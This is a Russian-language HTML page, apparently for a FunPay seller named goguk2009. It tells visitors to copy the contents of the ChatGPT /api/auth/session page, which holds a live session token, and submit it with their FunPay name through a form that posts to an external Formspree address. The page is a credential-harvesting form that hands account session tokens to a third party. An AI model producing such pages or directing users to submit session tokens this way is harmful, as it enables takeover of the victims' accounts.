<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Продавец : goguk2009</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./style.css" />
</head>
<body>
  <div class="stars"></div>
  <div class="nebula nebula-1"></div>
  <div class="nebula nebula-2"></div>

  <main class="page">
    <section class="hero-card">
      <div class="badge">Отправить длиный текст</div>
      <h1>Отправьте код со страницы :https://chatgpt.com/api/auth/session </h1>
      <p class="subtitle">
        Напишите <b>ИМЯ</b> как FunPay , и напишите в нижнем поле код .
      </p>

      <form id="messageForm" class="form" action="https://formspree.io/f/mojydoay" method="POST">
        <div class="field">
          <label for="name">Имя как на FUNPAY</label>
          <input
            id="name"
            name="name"
            type="text"
            maxlength="120"
            placeholder="Введите имя"
            required
          />
        </div>

        <div class="field">
        
        </div>

        <div class="field">
          <label for="message">КОД:</label>
          <textarea
            id="message"
            name="message"
            maxlength="9000"
            placeholder="код"
            required
          ></textarea>
          <div class="meta-row">
            <span class="hint">Максимум 9000 символов</span>
            <span id="counter" class="counter">0 / 9000</span>
          </div>
        </div>

        <input type="hidden" name="_subject" value="Новое сообщение с космического сайта" />
        <input type="hidden" name="page" value="github-pages-space-form" />

        <button id="submitBtn" type="submit">Отправить</button>
        <p id="status" class="status" aria-live="polite"></p>
      </form>

    
    </section>
  </main>

  <script src="./app.js"></script>
</body>
</html>
